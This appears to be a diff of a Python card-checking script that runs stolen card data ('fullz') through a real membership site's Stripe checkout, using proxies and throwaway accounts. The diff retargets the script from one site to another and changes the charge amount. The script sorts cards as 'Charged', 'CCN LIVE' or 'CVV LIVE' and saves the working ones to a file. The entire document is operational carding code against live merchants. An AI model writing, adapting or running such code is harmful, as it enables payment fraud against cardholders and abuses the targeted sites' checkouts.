@@ -172,41 +172,43 @@ async def create_payment_method(fullz, session, proxy_str):
             return {"html": "", "paid": False, "error": "Expiration Month Invalid ❌"}
 
         # ==== Kode utama ====
-        user = "renaseno" + str(random.randint(9999, 574545))
-        mail = "renaseno" + str(random.randint(9999, 574545)) + "@gmail.com"
-        pwd = "renaseno" + str(random.randint(9999, 574545))
+        user = "paraelsan" + str(random.randint(9999, 574545))
+        mail = "paraelsan" + str(random.randint(9999, 574545)) + "@gmail.com"
+        pwd = "Paraelsan" + str(random.randint(9999, 574545)) + "@"
 
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'priority': 'u=0, i',
-            'referer': 'https://oncologymedicalphysics.com/membership-account/membership-levels/',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
         params = {
-            'level': '10',
+            'level': '2',
         }
 
         response = requests.get(
-            'https://oncologymedicalphysics.com/membership-account/membership-checkout/',
+            'https://avweather.net/membership-account/membership-checkout/',
             params=params,
             headers=headers,
             proxies=proxies,
         )
 
-        nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
         pk = gets(response.text, '"publishableKey":"', '",')
-        acc = gets(response.text, '"user_id":"', '",')
+        nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
+        if not pk:
+            return {"html": response.text, "paid": False, "error": "Failed to get pk"}
+        if not nonce:
+            return {"html": response.text, "paid": False, "error": "Failed to get nonce"}
 
         headers = {
             'accept': 'application/json',
@@ -230,26 +232,20 @@ async def create_payment_method(fullz, session, proxy_str):
             'card[cvc]': cvv,
             'card[exp_month]': mes,
             'card[exp_year]': ano,
-            'guid':'ddb7184e-48e7-46c2-b95b-cd00a15be7c9ec361d',
-            'muid':'f4d6292e-97f9-41ce-88d0-17cf592455cf2f13ab',
-            'sid':'6840a2e6-878e-431d-b31c-d57ec263241134fb7e',
-            'payment_user_agent':'stripe.js/e49e4dd59e; stripe-js-v3/e49e4dd59e; split-card-element',
-            'referrer':'https://oncologymedicalphysics.com',
-            'time_on_page':'260012',
-            'client_attribution_metadata[client_session_id]':'8410e5d9-2da9-4481-b402-de10b2e475c6',
+            'guid':'fd158f34-badc-4a8f-beb7-1204440b230e769294',
+            'muid':'d7acb112-7648-416d-8da3-8d20b8cf24214ccd8c',
+            'sid':'847b8835-d8e6-422e-9e8f-585c1abe44a74d58f1',
+            'payment_user_agent':'stripe.js/4e21d61aa2; stripe-js-v3/4e21d61aa2; split-card-element',
+            'referrer':'https://avweather.net',
+            'time_on_page':'337177',
+            'client_attribution_metadata[client_session_id]':'424414a4-37be-45b8-bb41-2d8fe35ad078',
             'client_attribution_metadata[merchant_integration_source]':'elements',
             'client_attribution_metadata[merchant_integration_subtype]':'card-element',
             'client_attribution_metadata[merchant_integration_version]':'2017',
             'key': pk,
-            '_stripe_account': acc,
         }
 
-        response = requests.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers=headers,
-            data=data,
-            proxies=proxies,
-        )
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxies,)
 
         pm_json = response.json()
         id = pm_json.get('id')
@@ -273,30 +269,30 @@ async def create_payment_method(fullz, session, proxy_str):
         last4 = pm_json.get('card', {}).get('last4', '')
 
         headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://oncologymedicalphysics.com',
-            'priority': 'u=0, i',
-            'referer': 'https://oncologymedicalphysics.com/membership-account/membership-checkout/?level=10',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://avweather.net',
+            'Referer': 'https://avweather.net/membership-account/membership-checkout/?level=2',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
         params = {
-            'level': '10',
+            'level': '2',
         }
 
         data = {
-            'pmpro_level': '10',
+            'pmpro_level': '2',
             'checkjavascript': '1',
             'pmpro_other_discount_code': '',
             'username': user,
@@ -307,8 +303,9 @@ async def create_payment_method(fullz, session, proxy_str):
             'fullname': '',
             'CardType': brand,
             'pmpro_discount_code': '',
+            'tos': '1',
             'pmpro_checkout_nonce': nonce,
-            '_wp_http_referer': '/membership-account/membership-checkout/?level=10',
+            '_wp_http_referer': '/membership-account/membership-checkout/?level=2',
             'submit-checkout': '1',
             'javascriptok': '1',
             'payment_method_id': id,
@@ -318,7 +315,7 @@ async def create_payment_method(fullz, session, proxy_str):
         }
 
         response = requests.post(
-            'https://oncologymedicalphysics.com/membership-account/membership-checkout/',
+            'https://avweather.net/membership-account/membership-checkout/',
             params=params,
             headers=headers,
             data=data,
@@ -343,7 +340,7 @@ async def charge_resp(result):
     try:
         if isinstance(result, dict):
             if result.get("paid"):
-                return "Charged 50$ 🔥"
+                return "Charged 27$ 🔥"
             else:
                 if result.get("error"):
                     return map_error_message(result.get("error"))
@@ -356,7 +353,7 @@ async def charge_resp(result):
             return mapped
 
         if '{"status":"SUCCEEDED",' in result_str or '"status":"succeeded"' in result_str:
-            return "Charged 50$ 🔥"
+            return "Charged 27$ 🔥"
 
         return result_str + "❌"
 
@@ -403,7 +400,7 @@ async def multi_checking(fullz, proxies):
 
     resp = f"{fullz} {response}"
 
-    if any(keyword in response for keyword in ["Charged 50$ 🔥", "CCN LIVE ❎", "CVV LIVE ❎", "Insufficient Funds ❎", "Your card does not support this type of purchase ❎", "Transaction not allowed ❎", "3D Challenge Required ❎", "CCN LIVE ❎"]):
+    if any(keyword in response for keyword in ["Charged 27$ 🔥", "CCN LIVE ❎", "CVV LIVE ❎", "Insufficient Funds ❎", "Your card does not support this type of purchase ❎", "Transaction not allowed ❎", "3D Challenge Required ❎", "CCN LIVE ❎"]):
         with open("charge.txt", "a", encoding="utf-8") as file:
             file.write(resp + "\n")
 
